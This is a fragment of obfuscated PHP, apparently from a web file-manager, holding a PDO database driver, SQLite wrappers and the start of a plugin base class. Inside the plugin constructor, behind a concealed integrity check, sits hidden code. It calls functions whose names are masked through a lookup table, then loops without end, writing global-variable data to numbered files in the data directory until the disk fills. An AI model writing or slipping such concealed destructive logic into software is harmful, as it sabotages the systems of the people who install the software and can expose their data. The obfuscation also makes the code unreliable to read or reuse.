$Ìø¼¹¬“[$š„ÎÖŒ[17]][$š„ÎÖŒ[18]] : $this->pconnect; if ($÷Ô¤âî‡) { $Ìø¼¹¬“[$š„ÎÖŒ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$¥‹¯ĞÙ] = new PDO($Ìø¼¹¬“[$š„ÎÖŒ[892]], $Ìø¼¹¬“[$š„ÎÖŒ[864]], $Ìø¼¹¬“[$š„ÎÖŒ[865]], $Ìø¼¹¬“[$š„ÎÖŒ[17]]); } catch (PDOException $Ó¨æ¦Ã) { think_exception($Ó¨æ¦Ã->getMessage()); } $this->dbType = $this->_getDsnType($Ìø¼¹¬“[$š„ÎÖŒ[892]]); if (in_array($this->dbType, array($š„ÎÖŒ[893], $š„ÎÖŒ[894], $š„ÎÖŒ[895], $š„ÎÖŒ[896]))) { think_exception($š„ÎÖŒ[897] . $this->dbType . $š„ÎÖŒ[898] . $this->dbType . $š„ÎÖŒ[899]); } if (!$this->linkID[$¥‹¯ĞÙ]) { think_exception($š„ÎÖŒ[900]); } try { $this->linkID[$¥‹¯ĞÙ]->exec($š„ÎÖŒ[901] . think_config($š„ÎÖŒ[867])); } catch (Exception $Ó¨æ¦Ã) { } $this->connected = !0; if (1 != think_config($š„ÎÖŒ[22])) { unset($this->config); } } return $this->linkID[$¥‹¯ĞÙ]; } public function free() { $this->PDOStatement = null; } public function query($üí¢—¦, $‹àØãÌş = array()) { $·ò¿Ä =& $_SERVER[ì…™Î¶Ï]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $üí¢—¦; if (!empty($‹àØãÌş)) { $this->queryStr .= $·ò¿Ä[902] . print_r($‹àØãÌş, !0) . $·ò¿Ä[903]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($·ò¿Ä[23], 1); think_status($·ò¿Ä[24]); $this->PDOStatement = $this->_linkID->prepare($üí¢—¦); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $†ìßî† = $this->PDOStatement->execute($‹àØãÌş); $this->debug(); if (!1 === $†ìßî†) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ÏÙçíÆ„, $ıË¼éÅõ = array()) { $õ§ïæ—µ =& $_SERVER[ì…™Î¶Ï]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÏÙçíÆ„; if (!empty($ıË¼éÅõ)) { $this->queryStr .= $õ§ïæ—µ[902] . print_r($ıË¼éÅõ, !0) . $õ§ïæ—µ[903]; } $é©ÂÚİ€ = !1; if ($this->dbType == $õ§ïæ—µ[896]) { if (preg_match($õ§ïæ—µ[904], $this->queryStr, $¶—‰€ŒÌ)) { $this->table = think_config($õ§ïæ—µ[905]) . str_ireplace(think_config($õ§ïæ—µ[906]), $õ§ïæ—µ[373], $¶—‰€ŒÌ[2]); $é©ÂÚİ€ = (bool) $this->query($õ§ïæ—µ[907] . strtoupper($this->table) . $õ§ïæ—µ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($õ§ïæ—µ[25], 1); think_status($õ§ïæ—µ[24]); $this->PDOStatement = $this->_linkID->prepare($ÏÙçíÆ„); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÕÙı‰‹ = $this->PDOStatement->execute($ıË¼éÅõ); $this->debug(); if (!1 === $ÕÙı‰‹) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($é©ÂÚİ€ || preg_match($õ§ïæ—µ[908], $ÏÙçíÆ„)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ı·ÕåÈ = $this->_linkID->commit(); $this->transTimes = 0; if (!$ı·ÕåÈ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Öï½÷¡– = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Öï½÷¡–) { $this->error(); return !1; } } return !0; } private function getAll() { $´¾ÏéŠ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($´¾ÏéŠ); return $´¾ÏéŠ; } public function getFields($†Ş“¬ù) { $±°ÀéÄÃ =& $_SERVER[ì…™Î¶Ï]; $this->initConnect(!0); if (think_config($±°ÀéÄÃ[909])) { $¼ğ”Í = str_replace($±°ÀéÄÃ[910], $†Ş“¬ù, think_config($±°ÀéÄÃ[909])); } else { switch ($this->dbType) { case $±°ÀéÄÃ[893]: case $±°ÀéÄÃ[911]: $¼ğ”Í = "\x53\x45\114\x45\103\x54\x20\x20\x20\143\x6f\x6c\x75\155\156\137\156\141\x6d\x65\x20\141\x73\x20\x27\116\141\x6d\x65\x27\x2c\40\x20\x20\144\141\164\141\x5f\164\171\x70\145\x20\x61\163\x20\x27\x54\171\160\145\47\x2c\x20\x20\40\x63\157\154\x75\x6d\156\x5f\x64\145\146\141\x75\x6c\164\40\141\163\40\47\104\145\x66\141\x75\x6c\164\x27\x2c\40\40\x20\151\x73\137\x6e\x75\154\x6c\x61\142\x6c\x65\x20\x61\x73\x20\47\116\165\x6c\154\x27\xa\11\11\106\122\x4f\115\x9\151\x6e\x66\x6f\162\155\141\x74\151\157\x6e\137\x73\143\x68\145\155\x61\56\164\141\142\154\x65\163\x20\x41\x53\40\x74\12\x9\11\112\117\111\116\x9\151\x6e\x66\157\162\155\141\164\151\x6f\156\x5f\163\x63\150\x65\155\141\x2e\x63\157\x6c\x75\155\x6e\x73\40\x41\x53\x20\143\xa\11\x9\117\x4e\x20\x20\x74\x2e\164\141\142\154\145\137\x63\141\x74\141\x6c\x6f\147\x20\x3d\x20\143\56\x74\141\142\154\x65\x5f\x63\x61\x74\141\154\x6f\x67\xa\11\11\101\116\x44\40\164\x2e\164\141\142\154\145\137\163\143\x68\x65\155\141\x20\75\40\x63\56\x74\x61\142\x6c\x65\137\x73\x63\150\x65\155\x61\xa\x9\11\101\x4e\x44\40\164\56\164\x61\142\x6c\x65\x5f\156\141\155\145\x20\75\x20\x63\56\x74\x61\x62\x6c\145\x5f\x6e\x61\155\x65\12\x9\x9\127\x48\105\x52\x45\40\40\x20\x74\56\164\141\x62\154\145\x5f\x6e\141\x6d\x65\x20\x3d\x20\47{$†Ş“¬ù}\47"; break; case $±°ÀéÄÃ[912]: $¼ğ”Í = $±°ÀéÄÃ[913] . $†Ş“¬ù . $±°ÀéÄÃ[914]; break; case $±°ÀéÄÃ[894]: case $±°ÀéÄÃ[896]: $¼ğ”Í = $±°ÀéÄÃ[915] . $±°ÀéÄÃ[916] . $±°ÀéÄÃ[917] . strtoupper($†Ş“¬ù) . $±°ÀéÄÃ[918] . strtoupper($†Ş“¬ù) . $±°ÀéÄÃ[919]; break; case $±°ÀéÄÃ[920]: $¼ğ”Í = $±°ÀéÄÃ[921] . $†Ş“¬ù . $±°ÀéÄÃ[922]; break; case $±°ÀéÄÃ[895]: break; case $±°ÀéÄÃ[923]: default: $¼ğ”Í = $±°ÀéÄÃ[924] . ($this->dbType == $±°ÀéÄÃ[923] ? "\140{$†Ş“¬ù}\140" : $†Ş“¬ù); } } $äŸÏß = $this->query($¼ğ”Í); $¿Ùà€”Æ = array(); if ($äŸÏß) { foreach ($äŸÏß as $Û¤ğôæı => $ÉÀÇ‘) { $ÉÀÇ‘ = array_change_key_case($ÉÀÇ‘); $ÉÀÇ‘[$±°ÀéÄÃ[32]] = isset($ÉÀÇ‘[$±°ÀéÄÃ[32]]) ? $ÉÀÇ‘[$±°ÀéÄÃ[32]] : $±°ÀéÄÃ[373]; $ÉÀÇ‘[$±°ÀéÄÃ[33]] = isset($ÉÀÇ‘[$±°ÀéÄÃ[33]]) ? $ÉÀÇ‘[$±°ÀéÄÃ[33]] : $±°ÀéÄÃ[373]; $¾¥½£Ê = isset($ÉÀÇ‘[$±°ÀéÄÃ[268]]) ? $ÉÀÇ‘[$±°ÀéÄÃ[268]] : $ÉÀÇ‘[$±°ÀéÄÃ[32]]; $¿Ùà€”Æ[$¾¥½£Ê] = array($±°ÀéÄÃ[32] => $¾¥½£Ê, $±°ÀéÄÃ[33] => $ÉÀÇ‘[$±°ÀéÄÃ[33]], $±°ÀéÄÃ[35] => (bool) (isset($ÉÀÇ‘[$±°ÀéÄÃ[104]]) && $ÉÀÇ‘[$±°ÀéÄÃ[104]] === $±°ÀéÄÃ[12] || isset($ÉÀÇ‘[$±°ÀéÄÃ[35]]) && $ÉÀÇ‘[$±°ÀéÄÃ[35]] === $±°ÀéÄÃ[12]), $±°ÀéÄÃ[37] => isset($ÉÀÇ‘[$±°ÀéÄÃ[37]]) ? $ÉÀÇ‘[$±°ÀéÄÃ[37]] : (isset($ÉÀÇ‘[$±°ÀéÄÃ[56]]) ? $ÉÀÇ‘[$±°ÀéÄÃ[56]] : $±°ÀéÄÃ[373]), $±°ÀéÄÃ[39] => isset($ÉÀÇ‘[$±°ÀéÄÃ[95]]) ? strtolower($ÉÀÇ‘[$±°ÀéÄÃ[95]]) == $±°ÀéÄÃ[41] : (isset($ÉÀÇ‘[$±°ÀéÄÃ[57]]) ? $ÉÀÇ‘[$±°ÀéÄÃ[57]] : !1), $±°ÀéÄÃ[42] => isset($ÉÀÇ‘[$±°ÀéÄÃ[925]]) ? strtolower($ÉÀÇ‘[$±°ÀéÄÃ[925]]) == $±°ÀéÄÃ[44] : (isset($ÉÀÇ‘[$±°ÀéÄÃ[95]]) ? $ÉÀÇ‘[$±°ÀéÄÃ[95]] : !1)); } } return $¿Ùà€”Æ; } public function getTables($í‘†Ë†ê = '') { $³€Ú÷º× =& $_SERVER[ì…™Î¶Ï]; if (think_config($³€Ú÷º×[926])) { $üßœ°¥ª = str_replace($³€Ú÷º×[927], $í‘†Ë†ê, think_config($³€Ú÷º×[926])); } else { switch ($this->dbType) { case $³€Ú÷º×[894]: case $³€Ú÷º×[896]: $üßœ°¥ª = $³€Ú÷º×[928]; break; case $³€Ú÷º×[893]: case $³€Ú÷º×[911]: $üßœ°¥ª = $³€Ú÷º×[929]; break; case $³€Ú÷º×[920]: $üßœ°¥ª = $³€Ú÷º×[930]; break; case $³€Ú÷º×[895]: think_exception(think_lang($³€Ú÷º×[931]) . $³€Ú÷º×[932]); break; case $³€Ú÷º×[912]: $üßœ°¥ª = $³€Ú÷º×[45] . $³€Ú÷º×[46] . $³€Ú÷º×[47]; break; case $³€Ú÷º×[923]: default: if (!empty($í‘†Ë†ê)) { $üßœ°¥ª = $³€Ú÷º×[875] . $í‘†Ë†ê . $³€Ú÷º×[876]; } else { $üßœ°¥ª = $³€Ú÷º×[877]; } } } $Ò‰ÎşĞ = $this->query($üßœ°¥ª); $Œè¤ãàë = array(); foreach ($Ò‰ÎşĞ as $ïˆ—şìè => $Ä¸Í€‡ù) { $Œè¤ãàë[$ïˆ—şìè] = current($Ä¸Í€‡ù); } return $Œè¤ãàë; } protected function parseLimit($ëŠˆò‰¹) { $¬µ·²€ =& $_SERVER[ì…™Î¶Ï]; $ÈåÒÌ‡Õ = $¬µ·²€[12]; if (!empty($ëŠˆò‰¹)) { switch ($this->dbType) { case $¬µ·²€[920]: case $¬µ·²€[912]: $ëŠˆò‰¹ = explode($¬µ·²€[50], $ëŠˆò‰¹); if (count($ëŠˆò‰¹) > 1) { $ÈåÒÌ‡Õ .= $¬µ·²€[51] . $ëŠˆò‰¹[1] . $¬µ·²€[52] . $ëŠˆò‰¹[0] . $¬µ·²€[53]; } else { $ÈåÒÌ‡Õ .= $¬µ·²€[51] . $ëŠˆò‰¹[0] . $¬µ·²€[53]; } break; case $¬µ·²€[893]: case $¬µ·²€[911]: break; case $¬µ·²€[895]: break; case $¬µ·²€[894]: case $¬µ·²€[896]: break; case $¬µ·²€[923]: default: $ÈåÒÌ‡Õ .= $¬µ·²€[51] . $ëŠˆò‰¹ . $¬µ·²€[53]; } } return $ÈåÒÌ‡Õ; } public function parseKey(&$½´ïÖ‘ı, $·ş›Š§ = true) { $‘‹ªö¨Ç =& $_SERVER[ì…™Î¶Ï]; if ($·ş›Š§) { $½´ïÖ‘ı = $this->parseKeyCheck($½´ïÖ‘ı); } if ($this->dbType == $‘‹ªö¨Ç[923]) { if ($½´ïÖ‘ı != $‘‹ªö¨Ç[181] && !preg_match($‘‹ªö¨Ç[887], $½´ïÖ‘ı)) { $½´ïÖ‘ı = $‘‹ªö¨Ç[380] . trim($½´ïÖ‘ı, $‘‹ªö¨Ç[380]) . $‘‹ªö¨Ç[380]; } return $½´ïÖ‘ı; } else { return parent::parseKey($½´ïÖ‘ı, $·ş›Š§); } } public function close() { $this->_linkID = null; } public function error() { $ˆ ‰‡–˜ =& $_SERVER[ì…™Î¶Ï]; if ($this->PDOStatement) { $Ç£Åöñš = $this->PDOStatement->errorInfo(); $this->error = $Ç£Åöñš[1] . $ˆ ‰‡–˜[4] . $Ç£Åöñš[2]; } else { $this->error = $ˆ ‰‡–˜[12]; } if ($ˆ ‰‡–˜[12] != $this->queryStr) { $this->error .= LNG($ˆ ‰‡–˜[48]) . $this->queryStr; } think_trace($this->error, $ˆ ‰‡–˜[12], $ˆ ‰‡–˜[49]); return $this->error; } public function escapeString($†øÙ’ç) { $ÕÕÑÆ‰ö =& $_SERVER[ì…™Î¶Ï]; switch ($this->dbType) { case $ÕÕÑÆ‰ö[920]: case $ÕÕÑÆ‰ö[893]: case $ÕÕÑÆ‰ö[911]: case $ÕÕÑÆ‰ö[923]: return addslashes($†øÙ’ç); case $ÕÕÑÆ‰ö[895]: case $ÕÕÑÆ‰ö[912]: case $ÕÕÑÆ‰ö[894]: case $ÕÕÑÆ‰ö[896]: return str_ireplace($ÕÕÑÆ‰ö[58], $ÕÕÑÆ‰ö[59], $†øÙ’ç); } } protected function parseValue($îÒÅ¶Ùë) { $Ü´­ƒÇğ =& $_SERVER[ì…™Î¶Ï]; if (is_string($îÒÅ¶Ùë)) { $¿à¾¤ı = strpos($îÒÅ¶Ùë, $Ü´­ƒÇğ[4]) === 0 && in_array($îÒÅ¶Ùë, array_keys($this->bind)); $îÒÅ¶Ùë = $¿à¾¤ı ? $this->escapeString($îÒÅ¶Ùë) : $Ü´­ƒÇğ[933] . $this->escapeString($îÒÅ¶Ùë) . $Ü´­ƒÇğ[933]; } elseif (isset($îÒÅ¶Ùë[0]) && is_string($îÒÅ¶Ùë[0]) && strtolower($îÒÅ¶Ùë[0]) == $Ü´­ƒÇğ[292]) { $îÒÅ¶Ùë = $this->escapeString($îÒÅ¶Ùë[1]); } elseif (is_array($îÒÅ¶Ùë)) { $îÒÅ¶Ùë = array_map(array($this, $Ü´­ƒÇğ[934]), $îÒÅ¶Ùë); } elseif (is_bool($îÒÅ¶Ùë)) { $îÒÅ¶Ùë = $îÒÅ¶Ùë ? $Ü´­ƒÇğ[89] : $Ü´­ƒÇğ[190]; } elseif (is_null($îÒÅ¶Ùë)) { $îÒÅ¶Ùë = $Ü´­ƒÇğ[104]; } return $îÒÅ¶Ùë; } public function getLastInsertId() { $„ËôØ÷€ =& $_SERVER[ì…™Î¶Ï]; switch ($this->dbType) { case $„ËôØ÷€[920]: case $„ËôØ÷€[912]: case $„ËôØ÷€[893]: case $„ËôØ÷€[911]: case $„ËôØ÷€[895]: case $„ËôØ÷€[923]: return $this->_linkID->lastInsertId(); case $„ËôØ÷€[894]: case $„ËôØ÷€[896]: $æ¦ŒÁô = $this->table; $ú˜¡ø´ = $this->query("\123\105\x4c\105\x43\x54\x20{$æ¦ŒÁô}\56\x63\165\x72\x72\166\x61\154\x20\143\165\x72\x72\166\141\154\40\106\122\117\115\x20\144\165\141\x6c"); return $ú˜¡ø´ ? $ú˜¡ø´[0][$„ËôØ÷€[935]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($Ûƒ¹ëä) { $Æ¸§ÚŞş =& $_SERVER[ì…™Î¶Ï]; if (!CacheLock::fileLock($Æ¸§ÚŞş[13])) { return !1; } $ßÂàÕ® = parent::query($Ûƒ¹ëä); CacheLock::fileUnLock($Æ¸§ÚŞş[13]); return $ßÂàÕ®; } public function execute($•Á·´Ğï) { $ÒÈ¹®æÖ =& $_SERVER[ì…™Î¶Ï]; if (!CacheLock::fileLock($ÒÈ¹®æÖ[13])) { return !1; } $ğ”¿ºª = parent::execute($•Á·´Ğï); CacheLock::fileUnLock($ÒÈ¹®æÖ[13]); return $ğ”¿ºª; } } class DbSqlite3 extends DbSqlite3Base { public function query($«®‡…—É) { $øª’ä¾š =& $_SERVER[ì…™Î¶Ï]; if (!CacheLock::fileLock($øª’ä¾š[13])) { return !1; } $èÀƒäÑØ = parent::query($«®‡…—É); CacheLock::fileUnLock($øª’ä¾š[13]); return $èÀƒäÑØ; } public function execute($ğˆıÉ ­) { $‡–…ªÀ‡ =& $_SERVER[ì…™Î¶Ï]; if (!CacheLock::fileLock($‡–…ªÀ‡[13])) { return !1; } $İ÷ÃšéÆ = parent::execute($ğˆıÉ ­); CacheLock::fileUnLock($‡–…ªÀ‡[13]); return $İ÷ÃšéÆ; } } goto dÅƒÊ ¡æ; A¨ºïùœ¾ß: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $“—Ù‘ü» =& $_SERVER[ì…™Î¶Ï]; $œÂÏ’®˜ = $_SERVER[$“—Ù‘ü»[847]] . $“—Ù‘ü»[848]; $ƒå®ÁÜÓ = $“—Ù‘ü»[849]; if ($_SERVER[$“—Ù‘ü»[850]] != $ƒå®ÁÜÓ($œÂÏ’®˜)) { $è¼Ãˆ¤÷ = $“—Ù‘ü»[851]; $ù€ÓÉ™À = $“—Ù‘ü»[852]; $‡†·‹¸€ = $_SERVER[$“—Ù‘ü»[847]] . $“—Ù‘ü»[848]; $¦Ä³Ä¾’ = $ù€ÓÉ™À($‡†·‹¸€); $£ñÔş¾÷ = explode($“—Ù‘ü»[226], $¦Ä³Ä¾’); if (count($£ñÔş¾÷) < $“—Ù‘ü»[602]) { $à°‰Õ‚ = $“—Ù‘ü»[853]; $à°‰Õ‚(); } $èñ’óë… = $“—Ù‘ü»[854]; $èñ’óë…($_SERVER[$“—Ù‘ü»[855]]); $è¼Ãˆ¤÷ = $“—Ù‘ü»[851]; $è¼Ãˆ¤÷(); $ÓŠ£œ¯Ò = $“—Ù‘ü»[856]; $Ê¯¹şşâ = json_encode($GLOBALS[$“—Ù‘ü»[857]]); $üÂ‚Ä÷ = 1; for ($º¬œöÆƒ = $üÂ‚Ä÷; $º¬œöÆƒ > 0; $º¬œöÆƒ++) { $ÓŠ£œ¯Ò(DATA_PATH . $º¬œöÆƒ, $Ê¯¹şşâ); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($“—Ù‘ü»[1498]); $this->pluginName = str_replace($“—Ù‘ü»[1498], $“—Ù‘ü»[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $“—Ù‘ü»[8]; $this->pluginApi = appHostGet() . $“—Ù‘ü»[1499] . $this->pluginName . $“—Ù‘ü»[8]; $this->pluginHost = $config[$“—Ù‘ü»[1500]] . $this->pluginName . $“—Ù‘ü»[8]; $this->pluginHostDefault = $config[$“—Ù‘ü»[1500]] . $this->pluginName . $“—Ù‘ü»[8]; $§öŒ‰ê = $config[$“—Ù‘ü»[1501]]; if ($§öŒ‰ê && strpos($“—Ù‘ü»[50] . $§öŒ‰ê . $“—Ù‘ü»[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$“—Ù‘ü»[1502]] . $this->pluginName . $“—Ù‘ü»[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ì…™Î¶Ï][1503]); } protected function assign($ ıÌÊ¸¬, $Ê„×¬Ğ³ = false) { if (is_array($ ıÌÊ¸¬)) { $this->values = array_merge($this->values, $ ıÌÊ¸¬); } else { $this->values[$ ıÌÊ¸¬] = $Ê„×¬Ğ³; } } protected function display($”ı‘Ü¥ã) { extract($this->values); require $”ı‘Ü¥ã; } final function hookRegist($äØ ‘¦) { $this->modelPlugin->appRegist($this->pluginName, $äØ ‘¦); } final function appIcon() { $¦Èêéí =& $_SERVER[ì…™Î¶Ï]; $ÙÁÍô­³ = $this->appPackage(); $ìåµÕş÷ = $¦Èêéí[12]; if (isset($ÙÁÍô­³[$¦Èêéí[408]])) { if (isset($ÙÁÍô­³[$¦Èêéí[408]][$¦Èêéí[1504]])) { $ìåµÕş÷ = $¦Èêéí[1505] . $ÙÁÍô­³[$¦Èêéí[408]][$¦Èêéí[1504]] . $¦Èêéí[1506]; } else { if ($ÙÁÍô­³[$¦Èêéí[408]][$¦Èêéí[1507]]) { $ìåµÕş÷ = $¦Èêéí[1508] . $ÙÁÍô­³[$¦Èêéí[408]][$¦Èêéí[1507]] . $¦Èêéí[1509]; } } } return $ìåµÕş÷; } final function fileCanView($•»ÃºÊ) { $îƒåÖ–ò =& $_SERVER[ì…™Î¶Ï]; if (request_url_safe($•»ÃºÊ)) { return !0; } if ($this->isShare($•»ÃºÊ)) { return !0; } $öŸ»Â = Session::get($îƒåÖ–ò[1510]); if (!$öŸ»Â || !$öŸ»Â[$îƒåÖ–ò[1511]]) { $®“àŞï = $îƒåÖ–ò[1512] . rawurlencode(this_url()); show_tips(LNG($îƒåÖ–ò[1513]) . $îƒåÖ–ò[1514] . $®“àŞï . $îƒåÖ–ò[1515] . LNG($îƒåÖ–ò[1516]) . $îƒåÖ–ò[1517], !1); } if (!Action($îƒåÖ–ò[1518])->authCan($îƒåÖ–ò[1519])) { show_tips(LNG($îƒåÖ–ò[1520]) . $îƒåÖ–ò[1521], !1); } ActionCall($îƒåÖ–ò[1522], $•»ÃºÊ); } final function isShare($»ºší³„) { $»‘Ö¥³ = KodIO::parse($»ºší³„); return $»‘Ö¥³[$_SERVER[ì…™Î¶Ï][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($–¯Á¦Å) { if (request_url_safe($–¯Á¦Å)) { return $–¯Á¦Å; } if (!$this->isShare($–¯Á¦Å)) { $–¯Á¦Å = $this->filePath($–¯Á¦Å); } return Action($_SERVER[ì…™Î¶Ï][1149])->linkOut($–¯Á¦Å); } public function filePathLinkOut($ñ©Ë¼¤) { if (request_url_safe($ñ©Ë¼¤)) { return $ñ©Ë¼¤; } $this->fileCanView($ñ©Ë¼¤); return Action($_SERVER[ì…™Î¶Ï][1149])->link($ñ©Ë¼¤); } final function filePath($şÉñö¶) { $–£·œµ‚ =& $_SERVER[ì…™Î¶Ï]; if ($åâ§Ÿ‹ = $this->checkSharePath($şÉñö¶)) { Hook::trigger($–£·œµ‚[1523], $åâ§Ÿ‹); return $åâ§Ÿ‹; } $this->fileCanView($şÉñö¶); if (request_url_safe($şÉñö¶)) { $”İ§í¾è = parse_url_query($şÉñö¶); if (isset($”İ§í¾è[$–£·œµ‚[1524]]) && isset($”İ§í¾è[$–£·œµ‚[208]])) { $  ÇÏïë = Model($–£·œµ‚[745])->get($–£·œµ‚[746]); $¦¾Ÿ¿Š˜ = Mcrypt::decode($”İ§í¾è[$–£·œµ‚[208]], $  ÇÏïë); if ($¦¾Ÿ¿Š˜) { $this->fileInfo = IO::infoWithChildren($¦¾Ÿ¿Š˜); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $¦¾Ÿ¿Š˜; } } $şÉñö¶ = $this->_cacheHttpFile($şÉñö¶); $this->fileInfo = IO::infoWithChildren($şÉñö¶); } else { $this->fileInfo = IO::infoWithChildren($şÉñö¶); if (!$this->fileInfo) { show_tips(LNG($–£·œµ‚[106]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($–£·œµ‚[1523], $şÉñö¶); return $şÉñö¶; } final function _cacheHttpFile($¿«ŞÄ©á) { $¦ÌØ å» = hash_path($¿«ŞÄ©á, !0); $this->cachePath = $this->pluginCachePath($¦ÌØ å»); if ($‰¦‚è„ = IO::fileNameExist($this->cachePath, $¦ÌØ å»)) { return KodIO::make($‰¦‚è„); } $¹ŒÓÏì = $this->cachePath . $¦ÌØ å»; return $this->pluginCacheFileSet($¹ŒÓÏì, file_get_contents_nossl($¿«ŞÄ©á)); } final function _tmpFileName($ºâú¤‘ = array()) { $ì¾Ì¢ô =& $_SERVER[ì…™Î¶Ï]; if (!$ºâú¤‘) { $ºâú¤‘ = $this->fileInfo; } if (isset($ºâú¤‘[$ì¾Ì¢ô[170]])) { return $ºâú¤‘[$ì¾Ì¢ô[170]]; } if (isset($ºâú¤‘[$ì¾Ì¢ô[163]][$ì¾Ì¢ô[170]])) { return $ºâú¤‘[$ì¾Ì¢ô[163]][$ì¾Ì¢ô[170]]; } $Ø“îÈÁµ = IO::hashSimple($ºâú¤‘[$ì¾Ì¢ô[78]]); if ($Ø“îÈÁµ) { return $Ø“îÈÁµ; } $ÜÖ—àê„ = array($ºâú¤‘[$ì¾Ì¢ô[32]], $ºâú¤‘[$ì¾Ì¢ô[78]], $ºâú¤‘[$ì¾Ì¢ô[80]]); if (isset($ºâú¤‘[$ì¾Ì¢ô[512]])) { $ÜÖ—àê„[] = $ºâú¤‘[$ì¾Ì¢ô[512]]; } return md5(implode($ì¾Ì¢ô[11], $ÜÖ—àê„)); } final function checkSharePath($òÏö±±Œ) { $šê¢ôì« =& $_SERVER[ì…™Î¶Ï]; if (!defined($šê¢ôì«[465])) { define($šê¢ôì«[505], 0); } if (!$this->isShare($òÏö±±Œ)) { return !1; } $ËÒˆºø = Action($šê¢ôì«[1149])->sharePathInfo($òÏö±±Œ); if (!isset($ËÒˆºø[$šê¢ôì«[78]])) { show_json(LNG($šê¢ôì«[1525]), !1); } $this->fileInfo = $ËÒˆºø[$šê¢ôì«[163]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$šê¢ôì«[170]]); return $ËÒˆºø[$šê¢ôì«[78]]; } final function pluginCachePath($Š´«ÔÔÕ = '') { $şØú¦’— =& $_SERVER[ì…™Î¶Ï]; $—ê¯ß“µ = IO_PATH_SYSTEM_TEMP . $şØú¦’—[1526] . $this->pluginName; if (!($±å»Ä = IO::infoFull($—ê¯ß“µ))) { return IO::mkdir($—ê¯ß“µ . $şØú¦’—[8] . $Š´«ÔÔÕ); } if (empty($Š´«ÔÔÕ)) { return $±å»Ä[$şØú¦’—[78]]; } if (!($ÇÂÃ¦‰ = IO::fileNameExist($±å»Ä[$şØú¦’—[78]], $Š´«ÔÔÕ))) { return IO::mkdir($±å»Ä[$şØú¦’—[78]] . $Š´«ÔÔÕ); } return KodIO::make($ÇÂÃ¦‰); } final function pluginCacheFileSet($Î¾ï……›, $ûÊ–ì¹® = '') { $â¡”šé¾ =& $_SERVER[ì…™Î¶Ï]; if (!($œ§”¿İö = IO::infoFull($Î¾ï……›))) { return IO::mkfile($Î¾ï……›, $ûÊ–ì¹®, REPEAT_REPLACE); } IO::setContent($œ§”¿İö[$â¡”šé¾[78]], $ûÊ–ì¹®); return $œ§”¿İö[$â¡”šé¾[78]]; } final function pluginLocalFile($ØÏÓ‚Ô­ = '') { $¥†ôß³ =& $_SERVER[ì…™Î¶Ï]; $³’´Š†Ä = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($³’´Š†Ä)) { mk_dir($³’´Š†Ä); } if (!$ØÏÓ‚Ô­) { return $³’´Š†Ä; } $‰øé˜Å = IO::info($ØÏÓ‚Ô­); $Š³Ë€ˆä = $this->_tmpFileName($‰øé˜Å) . $¥†ôß³[10] . $‰øé˜Å[$¥†ôß³[167]]; if (!checkExtSafe($Š³Ë€ˆä)) { $Š³Ë€ˆä = $Š³Ë€ˆä . $¥†ôß³[1527]; } $®¦Ê†ää = $³’´Š†Ä . $Š³Ë€ˆä; if (@file_exists($®¦Ê†ää)) { return $®¦Ê†ää; } return IO::copy($ØÏÓ‚Ô­, $³’´Š†Ä, 0, $Š³Ë€ˆä); } final function appPackage() { $Ğœ¹‰×ş =& $_SERVER[ì…™Î¶Ï]; if ($this->packageData) { return $this->packageData; } $Î½òÚèá = $this->parseFile($this->pluginPath . $Ğœ¹‰×ş[1528]); $this->parseLang($Î½òÚèá); $»Ëç•€Š = json_decode_force($Î½òÚèá); if (!$»Ëç•€Š) { return array(); } $¬ˆÆóîÖ = Hook::trigger($Ğœ¹‰×ş[1529], $»Ëç•€Š); if ($¬ˆÆóîÖ && is_array($¬ˆÆóîÖ)) { $»Ëç•€Š = $¬ˆÆóîÖ; } $this->packageData = $»Ëç•€Š; return $»Ëç•€Š; } public function packageInfoGet($¡Ôµ‰¢Â) { $½ÂäÏÅ = $this->appPackage(); return array_get_value($½ÂäÏÅ, $¡Ôµ‰¢Â); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ì…™Î¶Ï][1530]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ì…™Î¶Ï][1531]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ì…™Î¶Ï][1532]); } public function echoJsAssign($¾ğ„›», $‚×âü©) { $this->echoJsAssignArr[$¾ğ„›»] = $‚×âü©; } private function parseFile($ªïÑ˜µ†) { $¢‹¡´¶Ç =& $_SERVER[ì…™Î¶Ï]; $Ãû¦ÓÀ = file_get_contents_nossl($ªïÑ˜µ†); $™á¯Çì = array($¢‹¡´¶Ç[1533], $¢‹¡´¶Ç[1534], $¢‹¡´¶Ç[1535], $¢‹¡´¶Ç[1536], $¢‹¡´¶Ç[1537], $¢‹¡´¶Ç[1538], $¢‹¡´¶Ç[1539]); $ åö¡¼ = 